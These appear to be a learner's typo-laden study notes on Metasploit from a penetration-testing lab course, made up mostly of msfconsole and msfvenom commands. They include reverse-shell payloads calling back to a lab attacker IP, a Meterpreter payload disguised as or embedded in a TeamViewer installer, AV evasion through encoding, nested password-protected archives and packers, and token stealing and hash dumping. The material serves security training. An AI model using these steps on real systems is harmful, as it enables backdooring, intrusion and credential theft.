
# INtroduction to Metasploit

```
ls /opt/metasploit-framework/embedded/framework/modules/
```
`#### Modules`

```shell-session
ls /usr/share/metasploit-framework/plugins/
```

```shell-session
ls /usr/share/metasploit-framework/tools/
```

```shell-session
ls /usr/share/metasploit-framework/scripts/
```

# Intro to Msfconsole


## MSF Engagement Structure

The MSF engagement structure can be divided into five main categories.

- Enumeration
- Preparation
- Exploitation
- Privilege Escalation
- Post-Exploitation


# Modules

THis contsins the POC form the CVES

```shell-session
<No.> <type>/<os>/<service>/<name>
```
```shell-session
794   exploit/windows/ftp/scriptftp_list
```
`Syntax`


#### Index No.

Will bw used to use the exploit

#### Type

| **Type**    | **Description**                                                                                 |
| ----------- | ----------------------------------------------------------------------------------------------- |
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.  |
| `Encoders`  | Ensure that payloads are intact to their destination.                                           |
| `Exploits`  | Defined as modules that exploit a vulnerability that will allow for the payload delivery.       |
| `NOPs`      | (No Operation code) Keep the payload sizes consistent across exploit attempts.                  |
| `Payloads`  | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| `Plugins`   | Additional scripts can be integrated within an assessment with `msfconsole` and coexist.        |
| `Post`      | Wide array of modules to gather information, pivot deeper, etc.                                 |

#### OS

The `OS` tag specifies which operating system and architecture the module was created for.


#### Service

The `Service` tag refers to the vulnerable service that is running on the target machine

#### Name

Finally, the `Name` tag explains the actual action that can be performed using this module created for a specific purpose.


```shell-session
help search
```

```shell-session
search eternalromance
```

```shell-session
search eternalromance type:exploit
```

```shell-session
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

```shell-session
info
```
`After selecting the module this will give alot ore info about the module`


# Targets


```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7


msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6

target => 6
```

To identify a target correctly, we will need to:

- Obtain a copy of the target binaries
- Use msfpescan to locate a suitable return address


# Payloads


```shell-session
grep meterpreter show payloads
```
```shell-session
grep meterpreter grep reverse_tcp show payloads
```
`Above will help to filter down the search result`


```
set payload <no.>
```

If we want to check our LHOST IP address quickly, we can always call the `ifconfig` command directly from the msfconsole menu.

#### MSF - Meterpreter Commands

```shell-session
cd Users
```
`Navigating`

```shell-session
ls
```
`Listing files and dir`


## Payload Types

The table below contains the most common payloads used for Windows machines and their respective descriptions.

|**Payload**|**Description**|
|---|---|
|`generic/custom`|Generic listener, multi-use|
|`generic/shell_bind_tcp`|Generic listener, multi-use, normal shell, TCP connection binding|
|`generic/shell_reverse_tcp`|Generic listener, multi-use, normal shell, reverse TCP connection|
|`windows/x64/exec`|Executes an arbitrary command (Windows x64)|
|`windows/x64/loadlibrary`|Loads an arbitrary x64 library path|
|`windows/x64/messagebox`|Spawns a dialog via MessageBox using a customizable title, text & icon|
|`windows/x64/shell_reverse_tcp`|Normal shell, single payload, reverse TCP connection|
|`windows/x64/shell/reverse_tcp`|Normal shell, stager + stage, reverse TCP connection|
|`windows/x64/shell/bind_ipv6_tcp`|Normal shell, stager + stage, IPv6 Bind TCP stager|
|`windows/x64/meterpreter/$`|Meterpreter payload + varieties above|
|`windows/x64/powershell/$`|Interactive PowerShell sessions + varieties above|
|`windows/x64/vncinject/$`|VNC Server (Reflective Injection) + varieties above|

# Encoders

These are used too cahnge the artithecture and evade AV and ids/ips

```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```
`Generating Payload - Without Encoding`


```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```
`Generating Payload - With Encoding`

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
```
`TO see the encoder ooptions`

```shell-session
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```
`This will generate a payload with the exe format, called TeamViewerInstall.exe,`


```shell-session
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```
`Using Multiple Itretion of the same encoding scheme in above example it is 10 itrations`


# Databases


```shell-session
sudo service postgresql status
```
`Checking the status of postgresql`

```shell-session
sudo systemctl start postgresql
```

```shell-session
sudo msfdb init
```
`MSF - Initiate a Database`


```shell-session
sudo msfdb status
```

```shell-session
sudo msfdb run
```
`MSF - Connect to the Initiated Database`


```shell-session
AntivenomisCrazy@htb[/htb]$ msfdb reinit
AntivenomisCrazy@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
AntivenomisCrazy@htb[/htb]$ sudo service postgresql restart
AntivenomisCrazy@htb[/htb]$ msfconsole -q
```
`MSF - Reinitiate the Database`

#### MSF - Database Options

```shell-session
msf6 > help database

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces
```

## Using the Database

#### Workspaces

We can think of `Workspaces` the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.

```shell-session
msf6 > workspace

* default
```
`TO see all the workspaces`

```shell-session
workspace -a Target_1
```
`TO add the target_1 workspace`

```shell-session
workspace Target_1 
```
`TO select the workspace taget_1`

```shell-session
msf6 > workspace

  default
* Target_1
```

```shell-session
workspace -h
```
`To see what can you do with the workspaces`

```shell-session
db_import Target.xml
```
`Importing Scan Results`

```shell-session
msf6 > hosts
```
`THis will show the ip`

```shell-session
msf6 > services
```
`Ports and services`


```shell-session
db_nmap -sV -sS 10.10.10.8
```
`Using Nmap Inside MSFconsole`

```shell-session
db_export -f xml backup.xml
```
`After your work you can export the workspaces data to backup.xml`

```shell-session
Examples: Adding
   # Add a user, password and realm
   creds add user:admin password:notpassword realm:workgroup
   # Add a user and password
   creds add user:guest password:'guest password'
   # Add a password
   creds add password:'password without username'
   # Add a user with an NTLMHash
   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   # Add a NTLMHash
   creds add ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   # Add a Postgres MD5
   creds add user:postgres postgres:md5be86a79bf2043622d58d5453c47d4860
   # Add a user with an SSH key
   creds add user:sshadmin ssh-key:/path/to/id_rsa
   # Add a user and a NonReplayableHash
   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5
   # Add a NonReplayableHash
   creds add hash:d19c32489b870735b5f587d76b934283
```
`creds command`


```shell-session
loot
```
`loot in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more`


# Plugins

```
ls /opt/metasploit-framework/embedded/framework/plugins
```
`Dir for plugins`

```shell-session
load nessus
```
`To load the nessas plugin`

#### Installing the Plugin manually

First downnload the .rb file of your plugin

```shell-session
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```
`Copying the pentest.rb to the metasploit plugin folder`

```shell-session
load pentest
```
`Load the pentest plugin`

|                                                                                                                     |                                                                                                                                     |                                                                                                                 |
| ------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| [nMap (pre-installed)](pre-installed))                                                                            | [NexPose (pre-installed)](pre-installed))                                                                       | [Nessus (pre-installed)](pre-installed))                                               |
| [Mimikatz (pre-installed V.1)](pre-installed%20V.1))                                                 | [Stdapi (pre-installed)](pre-installed)) | [Railgun](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation) |
| [Priv](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb) | [Incognito (pre-installed)](pre-installed))                                 | [Darkoperator's](https://github.com/darkoperator/Metasploit-Plugins)                                            |


# Sessions

MSFconsole can manage multiple modules at the same time. This is one of the many reasons it provides the user with so much flexibility. This is done with the use of `Sessions`, which creates dedicated control interfaces for all of your deployed modules.


## Using Sessions

```
CTRL + Z 
```
```
 background
```
`Both above can be used to backgroung an session`


```shell-session
sessions
```
`This will list active sessions`

```shell-session
sessions -i 1
```
`To instract with an specific seession`

## Jobs

Other types of tasks inside sessions can also be converted into jobs to run in the background seamlessly, even if the session dies or disappears.

```shell-session
jobs -h
```
`Help menu for jobs`


```shell-session
exploit -j
```
`#### Running an Exploit as a Background Job`

```shell-session
jobs -l
```
`Listing Running Jobs`

```
kill [index no.]
```
`Kill an specific job`

```
kill -K
```
`Kills all jobs`

# Meterpreter

```shell-session
getuid
```

```shell-session
ps
```
`This will show the process and its PID`

```shell-session
steal_token 1836
```
`One Process was being runned by administrator so we stole it's token using it's pid`


```shell-session
search local_exploit_suggester
```
`THis is the local exploit suggester`


```shell-session
hashdump
```
`Dumping Hashes`

```shell-session
lsa_dump_sam
```

```shell-session
lsa_dump_secrets
```


# Writing and Improting Modules


```shell-session
AntivenomisCrazy@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
AntivenomisCrazy@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
```
`Loading Additional Modules at Runtime`


```shell-session
msf6 > reload_all
msf6 > use exploit/unix/webapp/nagios3_command_injection 
```


# Introduction to MSFvenom

```shell-session
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```


```shell-session
use multi/handler
```
`Setting Up Multi/Handler`

```shell-session
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

# Firewall and IDS/IPS evasion

```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```
`In the above we are using an TeamViewer.exe application which is legitimatte and adding our payload to it`



## Archive

```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```

```shell-session
AntivenomisCrazy@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
AntivenomisCrazy@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
AntivenomisCrazy@htb[/htb]$ rar a ~/test.rar -p ~/test.js
```
`#### Archiving the Payload`


```shell-session
AntivenomisCrazy@htb[/htb]$ mv test.rar test
AntivenomisCrazy@htb[/htb]$ ls

test   test.js
```
`#### Removing the .RAR Extension`


```shell-session
rar a test2.rar -p test
```
`#### Archiving the Payload Again`


```shell-session
AntivenomisCrazy@htb[/htb]$ mv test2.rar test2
AntivenomisCrazy@htb[/htb]$ ls

test   test2   test.js
```
`#### Removing the .RAR Extension`


## Packers

The term `Packer` refers to the result of an `executable compression` process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts.


|   |   |   |
|---|---|---|
|[UPX packer](https://upx.github.io)|[The Enigma Protector](https://enigmaprotector.com)|[MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm)|
|Alternate EXE Packer|ExeStealth|Morphine|
|MEW|Themida||


